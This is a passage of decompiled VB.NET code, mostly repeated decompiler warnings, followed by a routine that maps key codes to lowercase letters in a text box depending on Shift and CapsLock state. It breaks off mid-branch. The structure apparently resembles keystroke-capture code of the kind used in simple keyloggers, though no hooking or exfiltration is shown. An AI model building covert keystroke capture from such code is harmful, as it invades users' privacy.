		//IL_184b: Unknown result type (might be due to invalid IL or missing references)
		//IL_184e: Invalid comparison between Unknown and I4
		//IL_1875: Unknown result type (might be due to invalid IL or missing references)
		//IL_1878: Invalid comparison between Unknown and I4
		//IL_189f: Unknown result type (might be due to invalid IL or missing references)
		//IL_18a2: Invalid comparison between Unknown and I4
		//IL_18c9: Unknown result type (might be due to invalid IL or missing references)
		//IL_18cc: Invalid comparison between Unknown and I4
		//IL_18f3: Unknown result type (might be due to invalid IL or missing references)
		//IL_18f6: Invalid comparison between Unknown and I4
		//IL_191d: Unknown result type (might be due to invalid IL or missing references)
		//IL_1920: Invalid comparison between Unknown and I4
		//IL_1947: Unknown result type (might be due to invalid IL or missing references)
		//IL_194a: Invalid comparison between Unknown and I4
		//IL_1971: Unknown result type (might be due to invalid IL or missing references)
		//IL_1974: Invalid comparison between Unknown and I4
		//IL_199b: Unknown result type (might be due to invalid IL or missing references)
		//IL_199e: Invalid comparison between Unknown and I4
		//IL_19c5: Unknown result type (might be due to invalid IL or missing references)
		//IL_19c8: Invalid comparison between Unknown and I4
		//IL_19ef: Unknown result type (might be due to invalid IL or missing references)
		//IL_19f2: Invalid comparison between Unknown and I4
		//IL_1a27: Unknown result type (might be due to invalid IL or missing references)
		//IL_1a29: Invalid comparison between Unknown and I4
		//IL_1a5e: Unknown result type (might be due to invalid IL or missing references)
		//IL_1a61: Invalid comparison between Unknown and I4
		//IL_1a88: Unknown result type (might be due to invalid IL or missing references)
		//IL_1a8b: Invalid comparison between Unknown and I4
		//IL_1ab2: Unknown result type (might be due to invalid IL or missing references)
		//IL_1ab5: Invalid comparison between Unknown and I4
		//IL_1adc: Unknown result type (might be due to invalid IL or missing references)
		//IL_1adf: Invalid comparison between Unknown and I4
		//IL_1b06: Unknown result type (might be due to invalid IL or missing references)
		//IL_1b09: Invalid comparison between Unknown and I4
		//IL_1b30: Unknown result type (might be due to invalid IL or missing references)
		//IL_1b33: Invalid comparison between Unknown and I4
		//IL_1b5a: Unknown result type (might be due to invalid IL or missing references)
		//IL_1b5d: Invalid comparison between Unknown and I4
		//IL_1b84: Unknown result type (might be due to invalid IL or missing references)
		//IL_1b87: Invalid comparison between Unknown and I4
		//IL_1bae: Unknown result type (might be due to invalid IL or missing references)
		//IL_1bb1: Invalid comparison between Unknown and I4
		//IL_1bd8: Unknown result type (might be due to invalid IL or missing references)
		//IL_1bdb: Invalid comparison between Unknown and I4
		//IL_1c02: Unknown result type (might be due to invalid IL or missing references)
		//IL_1c05: Invalid comparison between Unknown and I4
		//IL_1c2c: Unknown result type (might be due to invalid IL or missing references)
		//IL_1c2f: Invalid comparison between Unknown and I4
		//IL_1c7d: Unknown result type (might be due to invalid IL or missing references)
		//IL_1c80: Invalid comparison between Unknown and I4
		//IL_1ca7: Unknown result type (might be due to invalid IL or missing references)
		//IL_1caa: Invalid comparison between Unknown and I4
		//IL_1cd1: Unknown result type (might be due to invalid IL or missing references)
		//IL_1cd4: Invalid comparison between Unknown and I4
		//IL_1cfb: Unknown result type (might be due to invalid IL or missing references)
		//IL_1cfe: Invalid comparison between Unknown and I4
		//IL_1d25: Unknown result type (might be due to invalid IL or missing references)
		//IL_1d28: Invalid comparison between Unknown and I4
		//IL_1d4f: Unknown result type (might be due to invalid IL or missing references)
		//IL_1d52: Invalid comparison between Unknown and I4
		//IL_1d79: Unknown result type (might be due to invalid IL or missing references)
		//IL_1d7c: Invalid comparison between Unknown and I4
		//IL_1da3: Unknown result type (might be due to invalid IL or missing references)
		//IL_1da6: Invalid comparison between Unknown and I4
		//IL_1dcd: Unknown result type (might be due to invalid IL or missing references)
		//IL_1dd0: Invalid comparison between Unknown and I4
		//IL_1df7: Unknown result type (might be due to invalid IL or missing references)
		//IL_1dfa: Invalid comparison between Unknown and I4
		//IL_1e21: Unknown result type (might be due to invalid IL or missing references)
		//IL_1e24: Invalid comparison between Unknown and I4
		//IL_1e4b: Unknown result type (might be due to invalid IL or missing references)
		//IL_1e4e: Invalid comparison between Unknown and I4
		//IL_1e75: Unknown result type (might be due to invalid IL or missing references)
		//IL_1e78: Invalid comparison between Unknown and I4
		//IL_1e9f: Unknown result type (might be due to invalid IL or missing references)
		//IL_1ea2: Invalid comparison between Unknown and I4
		//IL_1ec9: Unknown result type (might be due to invalid IL or missing references)
		//IL_1ecc: Invalid comparison between Unknown and I4
		//IL_1ef3: Unknown result type (might be due to invalid IL or missing references)
		//IL_1ef6: Invalid comparison between Unknown and I4
		//IL_1f1d: Unknown result type (might be due to invalid IL or missing references)
		//IL_1f20: Invalid comparison between Unknown and I4
		//IL_1f47: Unknown result type (might be due to invalid IL or missing references)
		//IL_1f4a: Invalid comparison between Unknown and I4
		//IL_1f71: Unknown result type (might be due to invalid IL or missing references)
		//IL_1f74: Invalid comparison between Unknown and I4
		//IL_1f9b: Unknown result type (might be due to invalid IL or missing references)
		//IL_1f9e: Invalid comparison between Unknown and I4
		//IL_1fc5: Unknown result type (might be due to invalid IL or missing references)
		//IL_1fc8: Invalid comparison between Unknown and I4
		//IL_1fef: Unknown result type (might be due to invalid IL or missing references)
		//IL_1ff2: Invalid comparison between Unknown and I4
		//IL_2019: Unknown result type (might be due to invalid IL or missing references)
		//IL_201c: Invalid comparison between Unknown and I4
		//IL_2043: Unknown result type (might be due to invalid IL or missing references)
		//IL_2046: Invalid comparison between Unknown and I4
		//IL_206d: Unknown result type (might be due to invalid IL or missing references)
		//IL_2070: Invalid comparison between Unknown and I4
		//IL_2097: Unknown result type (might be due to invalid IL or missing references)
		//IL_209a: Invalid comparison between Unknown and I4
		//IL_20c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_20c4: Invalid comparison between Unknown and I4
		//IL_20eb: Unknown result type (might be due to invalid IL or missing references)
		//IL_20ee: Invalid comparison between Unknown and I4
		//IL_2115: Unknown result type (might be due to invalid IL or missing references)
		//IL_2118: Invalid comparison between Unknown and I4
		//IL_213f: Unknown result type (might be due to invalid IL or missing references)
		//IL_2142: Invalid comparison between Unknown and I4
		//IL_2169: Unknown result type (might be due to invalid IL or missing references)
		//IL_216c: Invalid comparison between Unknown and I4
		//IL_2193: Unknown result type (might be due to invalid IL or missing references)
		//IL_2196: Invalid comparison between Unknown and I4
		//IL_21bd: Unknown result type (might be due to invalid IL or missing references)
		//IL_21c0: Invalid comparison between Unknown and I4
		//IL_21e7: Unknown result type (might be due to invalid IL or missing references)
		//IL_21ea: Invalid comparison between Unknown and I4
		//IL_2211: Unknown result type (might be due to invalid IL or missing references)
		//IL_2214: Invalid comparison between Unknown and I4
		//IL_223b: Unknown result type (might be due to invalid IL or missing references)
		//IL_223e: Invalid comparison between Unknown and I4
		//IL_2265: Unknown result type (might be due to invalid IL or missing references)
		//IL_226b: Invalid comparison between Unknown and I4
		//IL_2292: Unknown result type (might be due to invalid IL or missing references)
		//IL_2298: Invalid comparison between Unknown and I4
		//IL_22bf: Unknown result type (might be due to invalid IL or missing references)
		//IL_22c5: Invalid comparison between Unknown and I4
		//IL_22ec: Unknown result type (might be due to invalid IL or missing references)
		//IL_22f2: Invalid comparison between Unknown and I4
		//IL_2319: Unknown result type (might be due to invalid IL or missing references)
		//IL_231f: Invalid comparison between Unknown and I4
		//IL_2346: Unknown result type (might be due to invalid IL or missing references)
		//IL_234c: Invalid comparison between Unknown and I4
		//IL_2373: Unknown result type (might be due to invalid IL or missing references)
		//IL_2379: Invalid comparison between Unknown and I4
		//IL_23a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_23a6: Invalid comparison between Unknown and I4
		//IL_23cd: Unknown result type (might be due to invalid IL or missing references)
		//IL_23d3: Invalid comparison between Unknown and I4
		//IL_23fa: Unknown result type (might be due to invalid IL or missing references)
		//IL_2400: Invalid comparison between Unknown and I4
		//IL_2427: Unknown result type (might be due to invalid IL or missing references)
		//IL_242a: Invalid comparison between Unknown and I4
		//IL_2451: Unknown result type (might be due to invalid IL or missing references)
		//IL_2454: Invalid comparison between Unknown and I4
		//IL_247b: Unknown result type (might be due to invalid IL or missing references)
		//IL_247e: Invalid comparison between Unknown and I4
		//IL_24a5: Unknown result type (might be due to invalid IL or missing references)
		//IL_24a8: Invalid comparison between Unknown and I4
		//IL_24cf: Unknown result type (might be due to invalid IL or missing references)
		//IL_24d2: Invalid comparison between Unknown and I4
		//IL_24f9: Unknown result type (might be due to invalid IL or missing references)
		//IL_24fc: Invalid comparison between Unknown and I4
		//IL_2523: Unknown result type (might be due to invalid IL or missing references)
		//IL_2526: Invalid comparison between Unknown and I4
		//IL_254d: Unknown result type (might be due to invalid IL or missing references)
		//IL_2550: Invalid comparison between Unknown and I4
		//IL_2577: Unknown result type (might be due to invalid IL or missing references)
		//IL_257a: Invalid comparison between Unknown and I4
		//IL_25a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_25a4: Invalid comparison between Unknown and I4
		//IL_25cb: Unknown result type (might be due to invalid IL or missing references)
		//IL_25ce: Invalid comparison between Unknown and I4
		//IL_25f5: Unknown result type (might be due to invalid IL or missing references)
		//IL_25f8: Invalid comparison between Unknown and I4
		//IL_261f: Unknown result type (might be due to invalid IL or missing references)
		//IL_2622: Invalid comparison between Unknown and I4
		//IL_2649: Unknown result type (might be due to invalid IL or missing references)
		//IL_264c: Invalid comparison between Unknown and I4
		//IL_2673: Unknown result type (might be due to invalid IL or missing references)
		//IL_2676: Invalid comparison between Unknown and I4
		//IL_26ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_26ad: Invalid comparison between Unknown and I4
		//IL_26e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_26e5: Invalid comparison between Unknown and I4
		//IL_270c: Unknown result type (might be due to invalid IL or missing references)
		//IL_270f: Invalid comparison between Unknown and I4
		//IL_2736: Unknown result type (might be due to invalid IL or missing references)
		//IL_2739: Invalid comparison between Unknown and I4
		//IL_2760: Unknown result type (might be due to invalid IL or missing references)
		//IL_2763: Invalid comparison between Unknown and I4
		//IL_278a: Unknown result type (might be due to invalid IL or missing references)
		//IL_278d: Invalid comparison between Unknown and I4
		//IL_27b4: Unknown result type (might be due to invalid IL or missing references)
		//IL_27b7: Invalid comparison between Unknown and I4
		//IL_27de: Unknown result type (might be due to invalid IL or missing references)
		//IL_27e1: Invalid comparison between Unknown and I4
		//IL_2808: Unknown result type (might be due to invalid IL or missing references)
		//IL_280b: Invalid comparison between Unknown and I4
		//IL_2832: Unknown result type (might be due to invalid IL or missing references)
		//IL_2835: Invalid comparison between Unknown and I4
		//IL_285c: Unknown result type (might be due to invalid IL or missing references)
		//IL_285f: Invalid comparison between Unknown and I4
		//IL_2886: Unknown result type (might be due to invalid IL or missing references)
		//IL_2889: Invalid comparison between Unknown and I4
		//IL_28b0: Unknown result type (might be due to invalid IL or missing references)
		//IL_28b3: Invalid comparison between Unknown and I4
		//IL_2904: Unknown result type (might be due to invalid IL or missing references)
		//IL_2907: Invalid comparison between Unknown and I4
		//IL_292e: Unknown result type (might be due to invalid IL or missing references)
		//IL_2931: Invalid comparison between Unknown and I4
		//IL_2958: Unknown result type (might be due to invalid IL or missing references)
		//IL_295b: Invalid comparison between Unknown and I4
		//IL_2982: Unknown result type (might be due to invalid IL or missing references)
		//IL_2985: Invalid comparison between Unknown and I4
		//IL_29ac: Unknown result type (might be due to invalid IL or missing references)
		//IL_29af: Invalid comparison between Unknown and I4
		//IL_29d6: Unknown result type (might be due to invalid IL or missing references)
		//IL_29d9: Invalid comparison between Unknown and I4
		//IL_2a00: Unknown result type (might be due to invalid IL or missing references)
		//IL_2a03: Invalid comparison between Unknown and I4
		//IL_2a2a: Unknown result type (might be due to invalid IL or missing references)
		//IL_2a2d: Invalid comparison between Unknown and I4
		//IL_2a54: Unknown result type (might be due to invalid IL or missing references)
		//IL_2a57: Invalid comparison between Unknown and I4
		//IL_2a7e: Unknown result type (might be due to invalid IL or missing references)
		//IL_2a81: Invalid comparison between Unknown and I4
		//IL_2aa8: Unknown result type (might be due to invalid IL or missing references)
		//IL_2aab: Invalid comparison between Unknown and I4
		//IL_2ad2: Unknown result type (might be due to invalid IL or missing references)
		//IL_2ad5: Invalid comparison between Unknown and I4
		//IL_2afc: Unknown result type (might be due to invalid IL or missing references)
		//IL_2aff: Invalid comparison between Unknown and I4
		//IL_2b26: Unknown result type (might be due to invalid IL or missing references)
		//IL_2b29: Invalid comparison between Unknown and I4
		//IL_2b50: Unknown result type (might be due to invalid IL or missing references)
		//IL_2b53: Invalid comparison between Unknown and I4
		//IL_2b7a: Unknown result type (might be due to invalid IL or missing references)
		//IL_2b7d: Invalid comparison between Unknown and I4
		//IL_2ba4: Unknown result type (might be due to invalid IL or missing references)
		//IL_2ba7: Invalid comparison between Unknown and I4
		//IL_2bce: Unknown result type (might be due to invalid IL or missing references)
		//IL_2bd1: Invalid comparison between Unknown and I4
		//IL_2bf8: Unknown result type (might be due to invalid IL or missing references)
		//IL_2bfb: Invalid comparison between Unknown and I4
		//IL_2c22: Unknown result type (might be due to invalid IL or missing references)
		//IL_2c25: Invalid comparison between Unknown and I4
		//IL_2c4c: Unknown result type (might be due to invalid IL or missing references)
		//IL_2c4f: Invalid comparison between Unknown and I4
		//IL_2c76: Unknown result type (might be due to invalid IL or missing references)
		//IL_2c79: Invalid comparison between Unknown and I4
		//IL_2ca0: Unknown result type (might be due to invalid IL or missing references)
		//IL_2ca3: Invalid comparison between Unknown and I4
		//IL_2cca: Unknown result type (might be due to invalid IL or missing references)
		//IL_2ccd: Invalid comparison between Unknown and I4
		//IL_2cf4: Unknown result type (might be due to invalid IL or missing references)
		//IL_2cf7: Invalid comparison between Unknown and I4
		//IL_2d1e: Unknown result type (might be due to invalid IL or missing references)
		//IL_2d21: Invalid comparison between Unknown and I4
		//IL_2d48: Unknown result type (might be due to invalid IL or missing references)
		//IL_2d4b: Invalid comparison between Unknown and I4
		//IL_2d72: Unknown result type (might be due to invalid IL or missing references)
		//IL_2d75: Invalid comparison between Unknown and I4
		//IL_2d9c: Unknown result type (might be due to invalid IL or missing references)
		//IL_2d9f: Invalid comparison between Unknown and I4
		//IL_2dc6: Unknown result type (might be due to invalid IL or missing references)
		//IL_2dc9: Invalid comparison between Unknown and I4
		//IL_2df0: Unknown result type (might be due to invalid IL or missing references)
		//IL_2df3: Invalid comparison between Unknown and I4
		//IL_2e1a: Unknown result type (might be due to invalid IL or missing references)
		//IL_2e1d: Invalid comparison between Unknown and I4
		//IL_2e44: Unknown result type (might be due to invalid IL or missing references)
		//IL_2e47: Invalid comparison between Unknown and I4
		//IL_2e6e: Unknown result type (might be due to invalid IL or missing references)
		//IL_2e71: Invalid comparison between Unknown and I4
		//IL_2e98: Unknown result type (might be due to invalid IL or missing references)
		//IL_2e9b: Invalid comparison between Unknown and I4
		//IL_2ec2: Unknown result type (might be due to invalid IL or missing references)
		//IL_2ec5: Invalid comparison between Unknown and I4
		//IL_2eec: Unknown result type (might be due to invalid IL or missing references)
		//IL_2ef2: Invalid comparison between Unknown and I4
		//IL_2f19: Unknown result type (might be due to invalid IL or missing references)
		//IL_2f1f: Invalid comparison between Unknown and I4
		//IL_2f46: Unknown result type (might be due to invalid IL or missing references)
		//IL_2f4c: Invalid comparison between Unknown and I4
		//IL_2f73: Unknown result type (might be due to invalid IL or missing references)
		//IL_2f79: Invalid comparison between Unknown and I4
		//IL_2fa0: Unknown result type (might be due to invalid IL or missing references)
		//IL_2fa6: Invalid comparison between Unknown and I4
		//IL_2fcd: Unknown result type (might be due to invalid IL or missing references)
		//IL_2fd3: Invalid comparison between Unknown and I4
		//IL_2ffa: Unknown result type (might be due to invalid IL or missing references)
		//IL_3000: Invalid comparison between Unknown and I4
		//IL_3027: Unknown result type (might be due to invalid IL or missing references)
		//IL_302d: Invalid comparison between Unknown and I4
		//IL_3054: Unknown result type (might be due to invalid IL or missing references)
		//IL_305a: Invalid comparison between Unknown and I4
		//IL_3081: Unknown result type (might be due to invalid IL or missing references)
		//IL_3087: Invalid comparison between Unknown and I4
		//IL_30ae: Unknown result type (might be due to invalid IL or missing references)
		//IL_30b1: Invalid comparison between Unknown and I4
		//IL_30d8: Unknown result type (might be due to invalid IL or missing references)
		//IL_30db: Invalid comparison between Unknown and I4
		//IL_3102: Unknown result type (might be due to invalid IL or missing references)
		//IL_3105: Invalid comparison between Unknown and I4
		//IL_312c: Unknown result type (might be due to invalid IL or missing references)
		//IL_312f: Invalid comparison between Unknown and I4
		//IL_3156: Unknown result type (might be due to invalid IL or missing references)
		//IL_3159: Invalid comparison between Unknown and I4
		//IL_3180: Unknown result type (might be due to invalid IL or missing references)
		//IL_3183: Invalid comparison between Unknown and I4
		//IL_31aa: Unknown result type (might be due to invalid IL or missing references)
		//IL_31ad: Invalid comparison between Unknown and I4
		//IL_31d4: Unknown result type (might be due to invalid IL or missing references)
		//IL_31d7: Invalid comparison between Unknown and I4
		//IL_31fe: Unknown result type (might be due to invalid IL or missing references)
		//IL_3201: Invalid comparison between Unknown and I4
		//IL_3228: Unknown result type (might be due to invalid IL or missing references)
		//IL_322b: Invalid comparison between Unknown and I4
		//IL_3252: Unknown result type (might be due to invalid IL or missing references)
		//IL_3255: Invalid comparison between Unknown and I4
		//IL_327c: Unknown result type (might be due to invalid IL or missing references)
		//IL_327f: Invalid comparison between Unknown and I4
		//IL_32a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_32a9: Invalid comparison between Unknown and I4
		//IL_32d0: Unknown result type (might be due to invalid IL or missing references)
		//IL_32d3: Invalid comparison between Unknown and I4
		//IL_32fa: Unknown result type (might be due to invalid IL or missing references)
		//IL_32fd: Invalid comparison between Unknown and I4
		//IL_3332: Unknown result type (might be due to invalid IL or missing references)
		//IL_3334: Invalid comparison between Unknown and I4
		//IL_3369: Unknown result type (might be due to invalid IL or missing references)
		//IL_336c: Invalid comparison between Unknown and I4
		//IL_3393: Unknown result type (might be due to invalid IL or missing references)
		//IL_3396: Invalid comparison between Unknown and I4
		//IL_33bd: Unknown result type (might be due to invalid IL or missing references)
		//IL_33c0: Invalid comparison between Unknown and I4
		//IL_33e7: Unknown result type (might be due to invalid IL or missing references)
		//IL_33ea: Invalid comparison between Unknown and I4
		//IL_3411: Unknown result type (might be due to invalid IL or missing references)
		//IL_3414: Invalid comparison between Unknown and I4
		//IL_343b: Unknown result type (might be due to invalid IL or missing references)
		//IL_343e: Invalid comparison between Unknown and I4
		//IL_3465: Unknown result type (might be due to invalid IL or missing references)
		//IL_3468: Invalid comparison between Unknown and I4
		//IL_348f: Unknown result type (might be due to invalid IL or missing references)
		//IL_3492: Invalid comparison between Unknown and I4
		//IL_34b9: Unknown result type (might be due to invalid IL or missing references)
		//IL_34bc: Invalid comparison between Unknown and I4
		//IL_34e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_34e6: Invalid comparison between Unknown and I4
		//IL_350d: Unknown result type (might be due to invalid IL or missing references)
		//IL_3510: Invalid comparison between Unknown and I4
		//IL_3537: Unknown result type (might be due to invalid IL or missing references)
		//IL_353a: Invalid comparison between Unknown and I4
		//IL_358b: Unknown result type (might be due to invalid IL or missing references)
		//IL_358e: Invalid comparison between Unknown and I4
		//IL_35b5: Unknown result type (might be due to invalid IL or missing references)
		//IL_35b8: Invalid comparison between Unknown and I4
		//IL_35df: Unknown result type (might be due to invalid IL or missing references)
		//IL_35e2: Invalid comparison between Unknown and I4
		//IL_3609: Unknown result type (might be due to invalid IL or missing references)
		//IL_360c: Invalid comparison between Unknown and I4
		//IL_3633: Unknown result type (might be due to invalid IL or missing references)
		//IL_3636: Invalid comparison between Unknown and I4
		//IL_365d: Unknown result type (might be due to invalid IL or missing references)
		//IL_3660: Invalid comparison between Unknown and I4
		//IL_3687: Unknown result type (might be due to invalid IL or missing references)
		//IL_368a: Invalid comparison between Unknown and I4
		//IL_36b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_36b4: Invalid comparison between Unknown and I4
		//IL_36db: Unknown result type (might be due to invalid IL or missing references)
		//IL_36de: Invalid comparison between Unknown and I4
		//IL_3705: Unknown result type (might be due to invalid IL or missing references)
		//IL_3708: Invalid comparison between Unknown and I4
		//IL_372f: Unknown result type (might be due to invalid IL or missing references)
		//IL_3732: Invalid comparison between Unknown and I4
		//IL_3759: Unknown result type (might be due to invalid IL or missing references)
		//IL_375c: Invalid comparison between Unknown and I4
		//IL_3783: Unknown result type (might be due to invalid IL or missing references)
		//IL_3786: Invalid comparison between Unknown and I4
		//IL_37ad: Unknown result type (might be due to invalid IL or missing references)
		//IL_37b0: Invalid comparison between Unknown and I4
		//IL_37d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_37da: Invalid comparison between Unknown and I4
		//IL_3801: Unknown result type (might be due to invalid IL or missing references)
		//IL_3804: Invalid comparison between Unknown and I4
		//IL_382b: Unknown result type (might be due to invalid IL or missing references)
		//IL_382e: Invalid comparison between Unknown and I4
		//IL_3855: Unknown result type (might be due to invalid IL or missing references)
		//IL_3858: Invalid comparison between Unknown and I4
		//IL_387f: Unknown result type (might be due to invalid IL or missing references)
		//IL_3882: Invalid comparison between Unknown and I4
		//IL_38a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_38ac: Invalid comparison between Unknown and I4
		//IL_38d3: Unknown result type (might be due to invalid IL or missing references)
		//IL_38d6: Invalid comparison between Unknown and I4
		//IL_38fd: Unknown result type (might be due to invalid IL or missing references)
		//IL_3900: Invalid comparison between Unknown and I4
		//IL_3927: Unknown result type (might be due to invalid IL or missing references)
		//IL_392a: Invalid comparison between Unknown and I4
		//IL_3951: Unknown result type (might be due to invalid IL or missing references)
		//IL_3954: Invalid comparison between Unknown and I4
		//IL_397b: Unknown result type (might be due to invalid IL or missing references)
		//IL_397e: Invalid comparison between Unknown and I4
		//IL_39a5: Unknown result type (might be due to invalid IL or missing references)
		//IL_39a8: Invalid comparison between Unknown and I4
		//IL_39cf: Unknown result type (might be due to invalid IL or missing references)
		//IL_39d2: Invalid comparison between Unknown and I4
		//IL_39f9: Unknown result type (might be due to invalid IL or missing references)
		//IL_39fc: Invalid comparison between Unknown and I4
		//IL_3a23: Unknown result type (might be due to invalid IL or missing references)
		//IL_3a26: Invalid comparison between Unknown and I4
		//IL_3a4d: Unknown result type (might be due to invalid IL or missing references)
		//IL_3a50: Invalid comparison between Unknown and I4
		//IL_3a77: Unknown result type (might be due to invalid IL or missing references)
		//IL_3a7a: Invalid comparison between Unknown and I4
		//IL_3aa1: Unknown result type (might be due to invalid IL or missing references)
		//IL_3aa4: Invalid comparison between Unknown and I4
		//IL_3acb: Unknown result type (might be due to invalid IL or missing references)
		//IL_3ace: Invalid comparison between Unknown and I4
		//IL_3af5: Unknown result type (might be due to invalid IL or missing references)
		//IL_3af8: Invalid comparison between Unknown and I4
		//IL_3b1f: Unknown result type (might be due to invalid IL or missing references)
		//IL_3b22: Invalid comparison between Unknown and I4
		//IL_3b49: Unknown result type (might be due to invalid IL or missing references)
		//IL_3b4c: Invalid comparison between Unknown and I4
		//IL_3b73: Unknown result type (might be due to invalid IL or missing references)
		//IL_3b79: Invalid comparison between Unknown and I4
		//IL_3ba0: Unknown result type (might be due to invalid IL or missing references)
		//IL_3ba6: Invalid comparison between Unknown and I4
		//IL_3bcd: Unknown result type (might be due to invalid IL or missing references)
		//IL_3bd3: Invalid comparison between Unknown and I4
		//IL_3bfa: Unknown result type (might be due to invalid IL or missing references)
		//IL_3c00: Invalid comparison between Unknown and I4
		//IL_3c27: Unknown result type (might be due to invalid IL or missing references)
		//IL_3c2d: Invalid comparison between Unknown and I4
		//IL_3c54: Unknown result type (might be due to invalid IL or missing references)
		//IL_3c5a: Invalid comparison between Unknown and I4
		//IL_3c81: Unknown result type (might be due to invalid IL or missing references)
		//IL_3c87: Invalid comparison between Unknown and I4
		//IL_3cae: Unknown result type (might be due to invalid IL or missing references)
		//IL_3cb4: Invalid comparison between Unknown and I4
		//IL_3cdb: Unknown result type (might be due to invalid IL or missing references)
		//IL_3ce1: Invalid comparison between Unknown and I4
		//IL_3d08: Unknown result type (might be due to invalid IL or missing references)
		//IL_3d0b: Invalid comparison between Unknown and I4
		//IL_3d32: Unknown result type (might be due to invalid IL or missing references)
		//IL_3d35: Invalid comparison between Unknown and I4
		//IL_3d5c: Unknown result type (might be due to invalid IL or missing references)
		//IL_3d5f: Invalid comparison between Unknown and I4
		//IL_3d86: Unknown result type (might be due to invalid IL or missing references)
		//IL_3d89: Invalid comparison between Unknown and I4
		//IL_3db0: Unknown result type (might be due to invalid IL or missing references)
		//IL_3db3: Invalid comparison between Unknown and I4
		//IL_3dda: Unknown result type (might be due to invalid IL or missing references)
		//IL_3ddd: Invalid comparison between Unknown and I4
		//IL_3e04: Unknown result type (might be due to invalid IL or missing references)
		//IL_3e07: Invalid comparison between Unknown and I4
		//IL_3e2e: Unknown result type (might be due to invalid IL or missing references)
		//IL_3e31: Invalid comparison between Unknown and I4
		//IL_3e58: Unknown result type (might be due to invalid IL or missing references)
		//IL_3e5b: Invalid comparison between Unknown and I4
		//IL_3e82: Unknown result type (might be due to invalid IL or missing references)
		//IL_3e85: Invalid comparison between Unknown and I4
		//IL_3eac: Unknown result type (might be due to invalid IL or missing references)
		//IL_3eaf: Invalid comparison between Unknown and I4
		//IL_3ed6: Unknown result type (might be due to invalid IL or missing references)
		//IL_3ed9: Invalid comparison between Unknown and I4
		//IL_3f00: Unknown result type (might be due to invalid IL or missing references)
		//IL_3f03: Invalid comparison between Unknown and I4
		//IL_3f2a: Unknown result type (might be due to invalid IL or missing references)
		//IL_3f2d: Invalid comparison between Unknown and I4
		//IL_3f54: Unknown result type (might be due to invalid IL or missing references)
		//IL_3f57: Invalid comparison between Unknown and I4
		//IL_3f8c: Unknown result type (might be due to invalid IL or missing references)
		//IL_3f8e: Invalid comparison between Unknown and I4
		//IL_3fc3: Unknown result type (might be due to invalid IL or missing references)
		//IL_3fc6: Invalid comparison between Unknown and I4
		//IL_3fed: Unknown result type (might be due to invalid IL or missing references)
		//IL_3ff0: Invalid comparison between Unknown and I4
		//IL_4017: Unknown result type (might be due to invalid IL or missing references)
		//IL_401a: Invalid comparison between Unknown and I4
		//IL_4041: Unknown result type (might be due to invalid IL or missing references)
		//IL_4044: Invalid comparison between Unknown and I4
		//IL_406b: Unknown result type (might be due to invalid IL or missing references)
		//IL_406e: Invalid comparison between Unknown and I4
		//IL_4095: Unknown result type (might be due to invalid IL or missing references)
		//IL_4098: Invalid comparison between Unknown and I4
		//IL_40bf: Unknown result type (might be due to invalid IL or missing references)
		//IL_40c2: Invalid comparison between Unknown and I4
		//IL_40e9: Unknown result type (might be due to invalid IL or missing references)
		//IL_40ec: Invalid comparison between Unknown and I4
		//IL_4113: Unknown result type (might be due to invalid IL or missing references)
		//IL_4116: Invalid comparison between Unknown and I4
		//IL_413d: Unknown result type (might be due to invalid IL or missing references)
		//IL_4140: Invalid comparison between Unknown and I4
		//IL_4164: Unknown result type (might be due to invalid IL or missing references)
		//IL_4167: Invalid comparison between Unknown and I4
		//IL_418b: Unknown result type (might be due to invalid IL or missing references)
		//IL_418e: Invalid comparison between Unknown and I4
		//IL_41b2: Unknown result type (might be due to invalid IL or missing references)
		//IL_41b8: Invalid comparison between Unknown and I4
		if (!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown() & !((Computer)MyProject.Computer).get_Keyboard().get_CapsLock())
		{
			if ((int)Key == 65)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "a");
			}
			else if ((int)Key == 66)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "b");
			}
			else if ((int)Key == 67)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "c");
			}
			else if ((int)Key == 68)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "d");
			}
			else if ((int)Key == 69)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "e");
			}
			else if ((int)Key == 70)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "f");
			}
			else if ((int)Key == 71)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "g");
			}
			else if ((int)Key == 72)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "h");
			}
			else if ((int)Key == 73)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "i");
			}
			else if ((int)Key == 74)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "j");
			}
			else if ((int)Key == 75)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "k");
			}
			else if ((int)Key == 76)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "l");
			}
			else if ((int)Key == 77)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "m");
			}
			else if ((int)Key == 78)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "n");
			}
			else if ((int)Key == 79)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "o");
			}
			else if ((int)Key == 80)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "p");
			}
			else if ((int)Key == 81)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "q");
			}
			else if ((int)Key == 82)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "r");
			}
			else if ((int)Key == 83)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "s");
			}
			else if ((int)Key == 84)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "t");
			}
			else if ((int)Key == 85)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "u");
			}
			else if ((int)Key == 86)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "v");
			}
			else if ((int)Key == 87)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "w");
			}
			else if ((int)Key == 88)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "x");
			}
			else if ((int)Key == 89)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "y");
			}
			else if ((int)Key == 90)
			{
